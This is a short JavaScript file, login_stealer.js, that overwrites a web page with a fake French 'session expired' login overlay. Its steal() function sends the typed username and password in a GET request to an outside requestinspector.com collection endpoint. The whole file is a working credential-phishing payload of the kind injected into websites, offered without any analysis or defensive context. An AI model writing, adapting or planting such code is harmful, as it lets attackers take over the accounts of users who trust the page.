// login_stealer.js
document.body.innerHTML = `
  <div style="position:fixed;top:0;left:0;width:100%;background:white;padding:20px;z-index:9999;">
    <h3>Votre session a expiré :</h3>
    <input id="user" placeholder="Identifiant">
    <input id="pass" placeholder="Mot de passe" type="password">
    <button onclick="steal()">Valider</button>
  </div>
`;

function steal() {
  fetch('https://01jtp7mdzdwyx80qn666dmwmgs00-87ccd764c062fb4853c7.requestinspector.com/wisso?user=' + user.value + '&pass=' + pass.value);
}
